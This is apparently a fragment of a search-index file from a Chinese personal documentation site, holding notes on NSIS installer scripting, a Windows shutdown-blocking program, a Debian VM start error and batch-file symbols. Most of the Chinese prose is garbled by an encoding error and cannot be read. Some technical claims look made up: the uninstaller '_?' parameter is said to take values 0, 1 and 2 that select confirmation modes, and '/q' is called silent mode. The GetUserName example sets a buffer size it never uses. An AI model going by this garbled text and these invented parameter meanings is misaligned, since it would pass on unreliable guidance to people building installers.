\"-LogSetOn\" LogSet on SectionEnd code: !include \"LogicLib.nsh\" Section \"-LogSetOn\" LogSet on SectionEnd æ³¨æ„å¯èƒ½ä¼šæœ‰æŠ¥é”™: Error: LogSet specified, NSIS_CONFIG_LOG not defined. è¿™æ˜¯å› ä¸ºå½“å‰å®‰è£…ç‰ˆæœ¬çš„ä¸€äº›å†…ç½®çš„ä¸œè¥¿æœ‰é—®é¢˜, éœ€è¦å»å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„å†…å®¹è¿›è¡Œè¦†ç›–, ä¸‹è½½åœ°å€: http://sourceforge.net/projects/nsis/files/ æ¯”å¦‚å®‰è£…ç‰ˆæœ¬æ˜¯ 3.06.1 , ä¸”æ˜¯logç›¸å…³çš„éƒ¨åˆ†, å°±ä¸‹è½½è¿™ä¸ªåŒ…: ä¸‹è½½å, æ‰¾åˆ°å®‰è£…ç›®å½•, è¿›è¡Œæ–‡ä»¶æ›¿æ¢. githubè§£å†³åœ°å€:: chore(deploy): Release #6730 NSIS_CONFIG_LOG not defined è°ƒè¯• è°ƒè¯•åªæœ‰ä¾èµ– å®‰è£…æ—¥å¿—è®¾ç½® æˆ–è€… æ¶ˆæ¯æ¡†(MessageBox)_ äº†. ä½¿ç”¨ MessageBox: MessageBox MB_OK \"å˜é‡\\$0çš„å€¼: $0\" åˆ¤æ–­ç”µè„‘ä½æ•° ä½¿ç”¨ x64.nsh !include \"x64.nsh\" ${If} ${RunningX64} ; æ˜¯64ä½çš„ ${EndIf} æ£€æŸ¥æ—§ç‰ˆæœ¬æ˜¯å¦å·²å®‰è£… éœ€è¦å…ˆä¸‹è½½å¥½ nsProcess.dll, ç„¶åä½¿ç”¨: nsProcess::_FindProcess \"xxx.exe\" é»˜è®¤æ˜¯æ²¡æœ‰è¿™ä¸ªdllçš„, éœ€è¦æ‰‹åŠ¨ä¸‹è½½, å‚è€ƒ: ã€NSISã€‘å®‰è£…æˆ–å¸è½½æ—¶ä½¿ç”¨nsProcessæ£€æŸ¥ç¨‹åºæ˜¯å¦æ­£åœ¨è¿è¡Œ ä¸‹è½½åœ°å€: NsProcess plugin è·å–å½“å‰ç”¨æˆ·å ä½¿ç”¨ GetUserName å‡½æ•°ã€‚è¯¥å‡½æ•°æ¥å—ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆå’Œç¼“å†²åŒºçš„å¤§å°ï¼Œå¹¶å°†å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åå†™å…¥ç¼“å†²åŒºä¸­ã€‚ ä¸‹é¢æ˜¯ç¤ºä¾‹ä»£ç : !include LogicLib.nsh ;å¯¼å…¥LogicLibæ’ä»¶ Section InitPluginsDir ;åˆå§‹åŒ–æ’ä»¶ç›®å½• ;å®šä¹‰å˜é‡å­˜å‚¨ç”¨æˆ·å Var username ;åˆ†é…ç¼“å†²åŒºçš„å¤§å°ä¸º256å­—èŠ‚ StrCpy $0 256 ;è°ƒç”¨ GetUserName å‡½æ•°å°†ç”¨æˆ·åå†™å…¥ç¼“å†²åŒºä¸­ System::Call 'advapi32::GetUserName(t r1, *i ${NSIS_MAX_STRLEN}) i.r0' ;å¦‚æœå‡½æ•°è¿”å›å€¼ä¸ä¸º0ï¼Œè¡¨ç¤ºæˆåŠŸè·å–åˆ°ç”¨æˆ·å ${If} $0 != 0 ;å°†ç¼“å†²åŒºä¸­çš„ç”¨æˆ·åèµ‹å€¼ç»™å˜é‡ StrCpy $username $1 ${EndIf} ;æ‰“å°ç”¨æˆ·å DetailPrint \"Username: $username\" SectionEnd NSISæ‰“åŒ…å®‰è£…ç¨‹åºæ—¶è·å–ç®¡ç†å‘˜æƒé™ NSISè„šæœ¬æ·»åŠ ä»¥ä¸‹ä»£ç : RequestExecutionLevel admin NSISå®‰è£…åçš„è„šæœ¬è‡ªåŠ¨ä½¿ç”¨ç®¡ç†å‘˜æƒé™ å†™æ³¨å†Œè¡¨çš„æ–¹å¼: WriteRegStr HKCU \\\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers\\\" \\\"$INSTDIR\\\\program.exe\\\" \\\"RUNASADMIN\\\" å…¶ä¸­program.exeä¸ºè¦æ‰§è¡Œçš„ä¸»ç¨‹åºçš„åç§° å°†æ–‡ä»¶(å¤¹)åŠ å…¥åˆ°å®‰è£…åŒ… ä½¿ç”¨ File <NSIS_File> æŒ‡ä»¤, å¦‚æœæ˜¯æ–‡ä»¶, ç›´æ¥è·Ÿæ–‡ä»¶å…¨å(åŒ…æ‹¬åç¼€), å¦‚æœæ˜¯æ–‡ä»¶å¤¹, åŠ  /r é€‰é¡¹å³å¯. å¦‚ä¸‹ä¾‹çš„ other æ–‡ä»¶å¤¹: Section Do SetOutPath $INSTDIR File /r other SectionEnd é‡Šæ”¾å¯¹å®‰è£…ç›®å½•çš„å ç”¨ æœ‰æ—¶å€™åœ¨æ‰§è¡Œbatè„šæœ¬æ—¶, éœ€è¦æ“ä½œå®‰è£…ç›®å½•, è¿™æ—¶éœ€è¦é‡Šæ”¾å¯¹å®‰è£…ç›®å½•çš„æ–‡ä»¶å¥æŸ„å ç”¨, åœ¨æ‰§è¡Œå‰ä½¿ç”¨ SetOutPath \"$TEMP\" åˆ‡æ¢ä¸€ä¸‹è¾“å‡ºç›®å½•å³å¯: Section SetOutPath \"$INSTDIR\" ; do ... SetOutPath \"$TEMP\" ;æ‰§è¡Œæ‰¹å¤„ç†æ–‡ä»¶ ExecWait '\"$INSTDIR\\your_batch_file.bat\"' SectionEnd æ³¨è§£ è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹æˆ‘ä¸€ç›´æ²¡æƒ³æ˜ç™½, æš‚ä¸”è®°ä¸‹æ¥å§: åœ¨ NSIS è„šæœ¬ä¸­è°ƒç”¨ bat æŒ‡ä»¤æ—¶, çœ‹ä»»åŠ¡ç®¡ç†å™¨, å®é™…æ˜¯ä¸€ä¸ª cmd.exe ä¸‹å¯åŠ¨çš„ç±»ä¼¼è¿›ç¨‹ç»„(Windowsè²Œä¼¼åªæœ‰ä»»åŠ¡, æ²¡æœ‰è¿›ç¨‹ç»„çš„æ¦‚å¿µ, æ­¤å¤„ä¸åšè®¨è®º). å³ä½¿è°ƒç”¨ bat æŒ‡ä»¤æ—¶, ä½¿ç”¨çš„æ˜¯ ExecShell <NSIS_ExecShell> æ¥åå°æ‰§è¡Œ, ä¸” NSIS è„šæœ¬å·²ç»æ‰§è¡Œå®Œæˆé€€å‡º. ä¸”æ­¤æ—¶çš„æƒ…å†µ: NSIS è„šæœ¬é€€å‡º NSIS è°ƒç”¨çš„åå°æ‰§è¡Œçš„ bat è„šæœ¬ä»åœ¨æ‰§è¡Œ è¿™æ—¶å€™ä¼šå‘ç° bat è„šæœ¬è¿˜æ˜¯æ‹¥æœ‰ $INSTDIR å®‰è£…ç›®å½•çš„å ç”¨, å…¶å®æ˜¯ SetOutPath çš„å ç”¨. ç›®å‰çŒœæµ‹æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½: NSIS å¯åŠ¨çš„å­è¿›ç¨‹çš„å¥æŸ„å ç”¨ä¼šä¼ é€’ç»™ bat è„šæœ¬ NSIS è„šæœ¬çš„å¥æŸ„å ç”¨ä¼šè¢« cmd.exe ç»™æ‹¿åˆ° å…·ä½“æ˜¯ä»€ä¹ˆæƒ…å†µ, æš‚æ—¶æ²¡çœ‹å‡ºæ¥... å†™å¸è½½è„šæœ¬ æœ‰æ—¶å€™å¯èƒ½åƒè‡ªå·±å†™ä¸€ä¸ªå¸è½½è„šæœ¬: WriteUninstaller \"$INSTDIR\\uninstall.exe\" æ³¨æ„è¿™ä¸ªæ—¶å€™å¿…é¡»å­˜åœ¨ Uninstall å°èŠ‚, å¦‚: Section Uninstall ; åœ¨è¿™é‡Œæ·»åŠ å¸è½½æ—¶è¦æ‰§è¡Œçš„æ“ä½œ ;Delete other/xxx ; SetOutPath \"$INSTDIR\" ; RMDir /r \"$INSTDIR\\other\" RMDir /r \"$INSTDIR\\other\" SectionEnd Uninstall å°èŠ‚æ˜¯é¢„å®šä¹‰åç§°çš„å°èŠ‚, å¸è½½æ—¶è°ƒç”¨. æ³¨æ„è¿™æ—¶å€™ä¸èƒ½ç›´æ¥è®¾ç½®è¾“å‡ºè·¯å¾„, ç„¶åä½¿ç”¨ç›¸å¯¹è·¯å¾„åˆ é™¤. è‹¥æœ‰éœ€è¦å¸è½½æ—¶è°ƒç”¨çš„å‡½æ•°, å‡½æ•°åéœ€ä»¥ un. å¼€å¤´. å¸è½½é¢„å®šä¹‰å‡½æ•°è§: å›è°ƒå‡½æ•° ç”³è¯·ç®¡ç†å‘˜æƒé™ åœ¨nsisè„šæœ¬å¼€å¤´å†™å…¥: RequestExecutionLevel admin å³å¯åœ¨æ‰§è¡Œå®‰è£…ç¨‹åºæ—¶å¼¹å‡ºç”³è¯·ç®¡ç†å‘˜æƒé™çª—å£. è‹¥æ²¡æœ‰, çœ‹çœ‹åé¢æ˜¯ä¸æ˜¯é‡å¤å†™äº†å…¶ä»–æƒé™å¦‚: RequestExecutionLevel user å†ä¸è¡Œå°±æ˜¯ä½ç‰ˆæœ¬nsisæˆ–æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä½ä¸æ”¯æŒ. å®‰è£…ä¸å¸è½½æ—¶å˜é‡å…±äº« èƒ½å…±äº«çš„å˜é‡åªæœ‰é¢„å®šä¹‰çš„ä¸€äº›å†…ç½®å˜é‡, ç›®å‰è‡ªå·±æµ‹è¯•è¿‡å¯è¡Œçš„åªæœ‰: $INSTDIR ä¸”åªèƒ½æ˜¯ä¸€å¼€å§‹å®šä¹‰çš„å®‰è£…ç›®å½•, è‹¥åç»­åœ¨å®‰è£…æ—¶æœ‰ä¿®æ”¹, å¸è½½æ—¶æ­¤ä¿®æ”¹ä¸ç”Ÿæ•ˆ. æ•…, è¦æƒ³å…±äº«, æœ€ç®€å•çš„å°±æ˜¯ä½¿ç”¨æ³¨å†Œè¡¨äº†, æ³¨æ„è¦ç”³è¯·ç®¡ç†å‘˜æƒé™ææƒæ‰èƒ½å†™æ³¨å†Œè¡¨, ä¾‹: RequestExecutionLevel user Var HomeDir Section Do1 WriteUninstaller \"$INSTDIR\\uninstall.exe\" StrCpy $HomeDir \"D:\\Program Files\\test\\Example2\" ; å°†å˜é‡çš„å€¼å†™å…¥å¸è½½ç¨‹åº WriteRegStr HKLM \"Software\\TNsis\" \"AppHomeDir\" \"$HomeDir\" SectionEnd Section Uninstall ; è¯»å–å˜é‡çš„å€¼ ReadRegStr $HomeDir HKLM \"Software\\TNsis\" \"AppHomeDir\" MessageBox MB_OK \"The value of HomeDir is $HomeDir\" ; åˆ é™¤æ³¨å†Œè¡¨é”® DeleteRegKey HKLM \"Software\\TNsis\" RMDir /r \"$HomeDir\" SectionEnd æ³¨å†Œè¡¨ç›¸å…³æ“ä½œå¯å‚è€ƒ: NSIS_æ³¨å†Œè¡¨æ“ä½œ å…¶ä»–æ–¹å¼å¯ä»¥é€šè¿‡å†™æ–‡ä»¶çš„æ–¹å¼, æœ‰ç‚¹éº»çƒ¦, æš‚ä¸è¡¨è¿° GUIç•Œé¢é€‰æ‹©å®‰è£…è·¯å¾„ éœ€è¦å…ˆå¯¼å…¥ MUI.nsh , ç„¶åæ’å…¥é¡µé¢: !include \"MUI.nsh\" !insertmacro MUI_PAGE_DIRECTORY ; é€‰æ‹©å®‰è£…è·¯å¾„é¡µé¢ !insertmacro MUI_PAGE_INSTFILES ; é€‰æ‹©å®‰è£…æ–‡ä»¶é¡µé¢ InstallDir \"$PROGRAMFILES\\MyApp\" ; æŒ‡å®šé»˜è®¤å®‰è£…è·¯å¾„ !insertmacro MUI_PAGE_FINISH ; å®‰è£…å®Œæˆé¡µé¢ æ³¨æ„, é€‰æ‹©å®‰è£…ä½ç½®çš„æ‰§è¡Œæ—¶é—´åœ¨ init ä¹‹å, æ‰€ä»¥è¦åœ¨ init ä¹‹åçš„ section è·å–å®‰è£…ä½ç½®æ‰æ˜¯å¯é çš„. æ­¤å¤´æ–‡ä»¶è¯¦æƒ…å¯è§: /docs/æ“ä½œç³»ç»Ÿ/windows/windowsæ‰§è¡Œæ–‡ä»¶æ‰“åŒ…/nsis/å¸¸ç”¨å¤´æ–‡ä»¶ NSIS å¸è½½ç¨‹åºå‚æ•° /q è¡¨ç¤ºé™é»˜å®‰è£… _? è¡¨ç¤ºæ˜¯å¦æ‰“å¼€GUIç¡®è®¤å¸è½½æ¡† _?=0ï¼šä¸éœ€è¦ç”¨æˆ·ç¡®è®¤ï¼Œç›´æ¥æ‰§è¡Œå¸è½½æ“ä½œ; _?=1ï¼šéœ€è¦ç”¨æˆ·ç¡®è®¤ï¼Œæ‰“å¼€å¸è½½ç¡®è®¤å¯¹è¯æ¡†; _?=2ï¼šéœ€è¦ç”¨æˆ·ç¡®è®¤ï¼Œä½†ä¸éœ€è¦æ˜¾ç¤ºå¸è½½ç¡®è®¤å¯¹è¯æ¡†. é»˜è®¤æƒ…å†µä¸‹ï¼ŒNSISè„šæœ¬ä¼šè‡ªåŠ¨å‘å¸è½½ç¨‹åºä¼ é€’ä¸€ä¸ª _?=1 çš„å‘½ä»¤è¡Œå‚æ•°. å¸è½½æ—¶çš„è¿”å›å€¼ æš‚æ—¶æ— è§£, è‡³å°‘æˆ‘ç›®å‰æ²¡æ‰¾åˆ° SetUninstallReturnValue eg: Function un.onUninstSuccess ; åœ¨è¿™é‡Œæ‰§è¡Œå¸è½½æˆåŠŸåçš„æ¸…ç†æ“ä½œ SetUninstallReturnValue 1234 ; æ‰‹åŠ¨æŠ›å‡ºè¿”å›å€¼ MessageBox MB_OK \"å¸è½½ç¨‹åºè¿”å›å€¼ï¼š$0\" FunctionEnd è¿™ä¸ªè²Œä¼¼ åªæœ‰æ—§ç‰ˆæœ¬çš„NSISæœ‰æŒ‡ä»¤ , æ–°ç‰ˆæœ¬æš‚æ—¶æ²¡æ‰¾åˆ°æ”¯æŒçš„æ–¹æ³•, æš‚æ—¶é€šè¿‡ åˆ¤æ–­å®‰è£…ç›®å½•æ˜¯å¦å­˜åœ¨ç¡®å®šæ˜¯å¦å¸è½½æˆåŠŸ : å¸è½½ç¨‹åºåç§°ç¡®å®š: StrCpy $1 \"$INSTDIR\\uninstall.exe\" è·å–ç›®å½•å­—ç¬¦ä¸²çš„é•¿åº¦, ç„¶åè·å–ç›®å½•: StrLen $9 $1 IntOp $8 $9 - 14 StrCpy $7 $1 $8 MessageBox MB_OK \"dir: $7\" ç¡®å®šç›®å½•æ˜¯å¦å­˜åœ¨: IfFileExists \"$7\" +1 +2 MessageBox MB_OK \"dir exists: $7 \" MessageBox MB_OK \"dir not exists: $7 \" å¸è½½æˆåŠŸçš„è¯æ–‡ä»¶æ˜¯ä¼šè¢«å…¨éƒ¨åˆ é™¤çš„. é™¤éç‰¹æ„ç•™ä¸‹æŸäº›æ®‹ç•™, é‚£å°±éœ€è¦è‡ªè¡Œå…¼å®¹å¤„ç†äº†. è·å–å®‰è£…çª—ä½“å¥æŸ„ ä½¿ç”¨å˜é‡ $HWNDPARENT å°†çª—ä½“å‰å°æ˜¾ç¤º ä½¿ç”¨ BringToFront æŒ‡ä»¤. ä¸è¿‡å­˜åœ¨ä¸€ä¸ªé—®é¢˜, æœ‰æ—¶å€™å‰å°æ˜¾ç¤ºæ•ˆæœæ˜¯: åœ¨ä»»åŠ¡æ é—ªçƒ, ç‚¹å‡»é—ªçƒå›¾æ ‡ååæ‰ä¼šå‰å°æ˜¾ç¤º","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-problems-and-skills.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-problems-and-skills.html"},{"title":"windowsä¸‹å…³æœºç¨‹åºæ­£åœ¨è¿è¡Œé—®é¢˜","text":"ä¸€èˆ¬æƒ…å†µä¸‹ç›´æ¥ä¸ç®¡å°±è¡Œï¼Œ æˆ‘çš„é—®é¢˜æ˜¯ï¼Œå‘ç°æœ‰ä¸€ä¸ªåå« t çš„ç¨‹åºä½†æ˜¯æˆ‘æ²¡æ‰§è¡Œè¿‡ï¼Œäºæ˜¯å°±å»ä»»åŠ¡ç®¡ç†å™¨é‡Œæ‰¾ï¼Œä¸€ç›´æ²¡æ‰¾åˆ°åˆ°ã€‚ tasklist ä¹Ÿæ‰¾äº†æ²¡æœ‰ã€‚ äºæ˜¯ç ”ç©¶äº†ä¸€ä¸‹ï¼Œ å‘ç°è¿™ä¸ªæç¤ºçš„åç§°å¹¶ä¸æ˜¯è¿›ç¨‹åï¼Œ è€Œæ˜¯è¿›ç¨‹æ‰“å¼€çª—å£çš„é‚£ä¸ªè¿›ç¨‹çš„ title è¿™é‡Œæ„Ÿè°¢çŸ¥å‹çš„è¿™ç¯‡å¸–å­ï¼š Windowså…³æœºæç¤º\"è¿™ä¸ªåº”ç”¨é˜»æ­¢å…³æœº\"ï¼Œæ€æ ·ç¡®è®¤æ˜¯ä»€ä¹ˆç¨‹åºï¼Ÿï¼Ÿ éœ€è¦æŸ¥çœ‹è½¯ä»¶æ ‡é¢˜çš„è¯å°±éœ€è¦å·¥å…·äº†ï¼Œæ¯”å¦‚ï¼š nirsoftçš„GUIPropView ä¸‹è½½åœ°å€ï¼š GUIPropView ä¸‹è½½åè§£å‹ç‚¹å‡»titleæ’åºå³å¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-lower-clearance-program-is-running-problems.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-lower-clearance-program-is-running-problems.html"},{"title":"Windowsæ‰“å¼€Debiané—®é¢˜ï¼ˆè™šæ‹Ÿæœºæ— æ³•æ‰“å¼€é—®é¢˜ï¼‰","text":"å‚è€ƒçš„å¯¹è±¡ç±»å‹ä¸æ”¯æŒå°è¯•çš„æ“ä½œã€‚ æŠ¥é”™ å‚è€ƒçš„å¯¹è±¡ç±»å‹ä¸æ”¯æŒå°è¯•çš„æ“ä½œã€‚ Press any key to continue... åŸå›  ä½¿ç”¨ä»£ç†è½¯ä»¶, æˆ–æ¸¸æˆåŠ é€ŸæœåŠ¡, winsockå‡ºç°é—®é¢˜ã€‚ æ³¨è§£ æˆ‘è¿™é‡Œæ˜¯å¼€å¯å†…å­˜å®Œæ•´æ€§å¼•èµ·çš„ å•æ¬¡è§£å†³ netsh winsock reset æ³¨è§£ åé¢å‘ç°æ˜¯å› ä¸ºæˆ‘å¼€å¯äº†å†…å­˜å®Œæ•´æ€§, ä¼šå½±å“è™šæ‹Ÿæœºå¯åŠ¨, è¿˜æœ‰dockerå®¹å™¨å¯åŠ¨, å…³é—­å³å¯ Win11 å†…å­˜å®Œæ•´æ€§å…³é—­çŠ¶æ€ åé¢è¡¥å……ï¼Œ å‘ç°è¿˜å¯èƒ½æœ‰ä¸ªåŸå› æ˜¯æ²¡æœ‰å¼€å¯Hyper-V åœ¨windowsåŠŸèƒ½é‡Œå®‰è£…æ‰“å¼€å³å¯ æ‰“å¼€åŠŸèƒ½Hyper-V","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-opens-the-Debian-problem.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-opens-the-Debian-problem.html"},{"title":"windows_shellç¬¦å·","text":"ä¸€äº›ç¬¦å· åŸæ–‡: ç¬¦å·çš„ç”¨æ³• å•ç¬¦å· ~ ~ â‘  åœ¨forä¸­è¡¨ç¤ºä½¿ç”¨å¢å¼ºçš„å˜é‡æ‰©å±•ã€‚ â‘¡ åœ¨%var:~n,m%ä¸­è¡¨ç¤ºä½¿ç”¨æ‰©å±•ç¯å¢ƒå˜é‡æŒ‡å®šä½ç½®çš„å­—ç¬¦ä¸²ã€‚ â‘¢ åœ¨set/aä¸­è¡¨ç¤ºä¸€å…ƒè¿ç®—ç¬¦ï¼Œå°†æ“ä½œæ•°æŒ‰ä½å–åã€‚ ! ! â‘  åœ¨set /aä¸­ä¸€å…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºé€»è¾‘éã€‚æ¯”å¦‚set /a a=!0ï¼Œè¿™æ—¶aå°±è¡¨ç¤ºé€»è¾‘1ã€‚ @ @ â‘  éšè—å‘½ä»¤è¡Œæœ¬èº«çš„å›æ˜¾ï¼Œå¸¸ç”¨äºæ‰¹å¤„ç†ä¸­ã€‚ $ $ â‘  åœ¨findstrå‘½ä»¤é‡Œé¢è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸã€‚ â‘¡ åœ¨promptå‘½ä»¤é‡Œé¢ï¼Œè¡¨ç¤ºå°†å…¶åçš„å­—ç¬¦è½¬ä¹‰ï¼ˆç¬¦å·åŒ–æˆ–è€…æ•ˆæœåŒ–ï¼‰ã€‚ % % â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºç®—æœ¯å–ä½™ã€‚ â‘¡ å‘½ä»¤è¡Œç¯å¢ƒä¸‹ï¼Œåœ¨forå‘½ä»¤inå‰ï¼Œåé¢æ¥ä¸€ä¸ªå­—ç¬¦ï¼ˆå¯ä»¥æ˜¯å­—æ¯ã€æ•°å­—æˆ–è€…ä¸€äº›ç‰¹å®šå­—ç¬¦ï¼‰ï¼Œè¡¨ç¤ºæŒ‡å®šä¸€ä¸ªå¾ªç¯æˆ–è€…éå†æŒ‡æ ‡å˜é‡ã€‚ â‘¢ æ‰¹å¤„ç†ä¸­ï¼Œåæ¥ä¸€ä¸ªæ•°å­—è¡¨ç¤ºå¼•ç”¨æœ¬æ‰¹å¤„ç†å½“å‰æ‰§è¡Œæ—¶çš„æŒ‡å®šçš„å‚æ•°ã€‚ â‘£ å…¶å®ƒæƒ…å†µä¸‹ï¼Œ%å°†ä¼šè¢«è„±å»ï¼ˆæ‰¹å¤„ç†ï¼‰æˆ–ä¿ç•™ï¼ˆå‘½ä»¤è¡Œï¼‰ &#94; &#94; â‘  å–æ¶ˆç‰¹å®šå­—ç¬¦çš„è½¬ä¹‰ä½œç”¨ï¼Œæ¯”å¦‚& | > < ! \"ç­‰ï¼Œä½†ä¸åŒ…æ‹¬%ã€‚æ¯”å¦‚è¦åœ¨å±å¹•æ˜¾ç¤ºä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ï¼Œæ¯”å¦‚> >> | &#94; &ç­‰ç¬¦å·æ—¶ï¼Œ å°±å¯ä»¥åœ¨å…¶å‰é¢åŠ ä¸€ä¸ª&#94;ç¬¦å·æ¥æ˜¾ç¤ºè¿™ä¸ª&#94;åé¢çš„å­—ç¬¦äº†ï¼Œ&#94;&#94;å°±æ˜¯æ˜¾ç¤ºä¸€ä¸ª&#94;ï¼Œ&#94;|å°±æ˜¯æ˜¾ç¤ºä¸€ä¸ª|å­—ç¬¦äº†; â‘¡ åœ¨set/aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºæŒ‰ä½å¼‚æˆ–ã€‚ â‘¢ åœ¨findstr/rçš„[]ä¸­è¡¨ç¤ºä¸åŒ¹é…æŒ‡å®šçš„å­—ç¬¦é›†ã€‚ & & â‘  å‘½ä»¤è¿æ¥å­—ç¬¦ã€‚æ¯”å¦‚æˆ‘è¦åœ¨ä¸€è¡Œæ–‡æœ¬ä¸ŠåŒæ—¶æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥ç”¨&å‘½ä»¤è¿æ¥è¿™ä¸¤ä¸ªå‘½ä»¤ã€‚ â‘¡ åœ¨set/aä¸­æ˜¯æŒ‰ä½ä¸ã€‚ * * â‘  ä»£è¡¨ä»»æ„ä¸ªä»»æ„å­—ç¬¦ï¼Œå°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„\"é€šé…ç¬¦\";æ¯”å¦‚æƒ³åœ¨cç›˜çš„æ ¹ç›®å½•æŸ¥æ‰¾cç›˜æ ¹ç›®å½•é‡Œæ‰€æœ‰çš„æ–‡æœ¬æ–‡ä»¶(.txt)ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾“å…¥å‘½ä»¤\"dir c:\\*.txt\"ã€‚ â‘¡ åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºç®—æœ¯ä¹˜æ³•ã€‚ â‘¢ åœ¨findstr/rä¸­è¡¨ç¤ºå°†å‰ä¸€ä¸ªå­—ç¬¦å¤šæ¬¡åŒ¹é…ã€‚ - - â‘  èŒƒå›´è¡¨ç¤ºç¬¦ï¼Œæ¯”å¦‚æ—¥æœŸçš„æŸ¥æ‰¾ï¼Œforå‘½ä»¤é‡Œçš„tokensæ“ä½œä¸­å°±å¯ä»¥ç”¨åˆ°è¿™ä¸ªå­—ç¬¦ã€‚ â‘¡ åœ¨findstr/rä¸­è¿æ¥ä¸¤ä¸ªå­—ç¬¦è¡¨ç¤ºåŒ¹é…èŒƒå›´ã€‚ â‘¢ -è·Ÿåœ¨æŸäº›å‘½ä»¤çš„/åè¡¨ç¤ºå–åå‘çš„å¼€å…³ã€‚ â‘£ åœ¨set /aä¸­ï¼š 1.è¡¨ç¤ºä¸€ä¸ªè´Ÿæ•°ã€‚ 2.è¡¨ç¤ºç®—æœ¯å‡è¿ç®—ã€‚ + + â‘  ä¸»è¦æ˜¯åœ¨copyå‘½ä»¤é‡Œé¢ä¼šç”¨åˆ°å®ƒï¼Œè¡¨ç¤ºå°†å¾ˆå¤šä¸ªæ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œå°±è¦ç”¨åˆ°è¿™ä¸ª+å­—ç¬¦äº†ã€‚ â‘¡ åœ¨set/aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦,è¡¨ç¤ºç®—æœ¯åŠ æ³•ã€‚ : : â‘  æ ‡ç­¾å®šä½ç¬¦ï¼Œè¡¨ç¤ºå…¶åçš„å­—ç¬¦ä¸²ä¸ºä»¥æ ‡ç­¾ï¼Œå¯ä»¥ä½œä¸ºgotoå‘½ä»¤çš„ä½œç”¨å¯¹è±¡ã€‚æ¯”å¦‚åœ¨æ‰¹å¤„ç†æ–‡ä»¶é‡Œé¢å®šä¹‰äº†ä¸€ä¸ª\":begin\"æ ‡ç­¾ï¼Œç”¨\"goto begin\"å‘½ä»¤å°±å¯ä»¥è½¬åˆ°\":begin\"æ ‡ç­¾åé¢æ¥æ‰§è¡Œæ‰¹å¤„ç†å‘½ä»¤äº†ã€‚ â‘¡ åœ¨%var:string1=string2%ä¸­åˆ†éš”å˜é‡åå’Œè¢«æ›¿æ¢å­—ä¸²å…³ç³»ã€‚ | | â‘  ç®¡é“ç¬¦ï¼Œå°±æ˜¯å°†ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥.\"dir /a/b |more\"å°±å¯ä»¥é€å±çš„æ˜¾ç¤ºdirå‘½ä»¤æ‰€è¾“å‡ºçš„ä¿¡æ¯ã€‚ â‘¡ åœ¨set/aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºæŒ‰ä½æˆ–ã€‚ â‘¢ åœ¨å¸®åŠ©æ–‡æ¡£ä¸­è¡¨ç¤ºå…¶å‰åä¸¤ä¸ªå¼€å…³ã€é€‰é¡¹æˆ–å‚æ•°æ˜¯äºŒé€‰ä¸€çš„ã€‚ / / â‘  è¡¨ç¤ºå…¶åçš„å­—ç¬¦ï¼ˆä¸²ï¼‰æ˜¯å‘½ä»¤çš„åŠŸèƒ½å¼€å…³ï¼ˆé€‰é¡¹ï¼‰ã€‚æ¯”å¦‚\"dir /s/b/a-d\"è¡¨ç¤º\"dir\"å‘½ä»¤æŒ‡å®šçš„ä¸åŒçš„å‚æ•°ã€‚ â‘¡ åœ¨set/aä¸­è¡¨ç¤ºé™¤æ³•ã€‚ > > â‘  å‘½ä»¤é‡å®šå‘ç¬¦ï¼Œå°†å…¶å‰é¢çš„å‘½ä»¤çš„è¾“å‡ºç»“æœé‡æ–°å®šå‘åˆ°å…¶åé¢çš„è®¾å¤‡ä¸­å»ï¼Œåé¢çš„è®¾å¤‡ä¸­çš„å†…å®¹è¢«è¦†ç›–ã€‚æ¯”å¦‚å¯ä»¥ç”¨\"dir > lxmxn.txt\"å°†\"dir\"å‘½ä»¤çš„ç»“æœè¾“å‡ºåˆ°\"lxmxn.txt\"è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­å»ã€‚ â‘¡ åœ¨findstr/rä¸­è¡¨ç¤ºåŒ¹é…å•è¯çš„å³è¾¹ç•Œï¼Œéœ€è¦é…åˆè½¬ä¹‰å­—ç¬¦\\ä½¿ç”¨ã€‚ < < â‘  å°†å…¶åé¢çš„æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå…¶å‰é¢å‘½ä»¤çš„è¾“å…¥ã€‚ â‘¡ åœ¨findstr/rä¸­è¡¨ç¤ºåŒ¹é…å•è¯çš„å·¦è¾¹ç•Œï¼Œéœ€è¦é…åˆè½¬ä¹‰å­—ç¬¦\\ä½¿ç”¨ã€‚ = = â‘  èµ‹å€¼ç¬¦å·ï¼Œç”¨äºå˜é‡çš„èµ‹å€¼ã€‚æ¯”å¦‚\"set a=windows\"çš„æ„æ€æ„æ€æ˜¯å°†\"windows\"è¿™ä¸ªå­—ç¬¦ä¸²èµ‹ç»™å˜é‡\"a\"ã€‚ â‘¡ 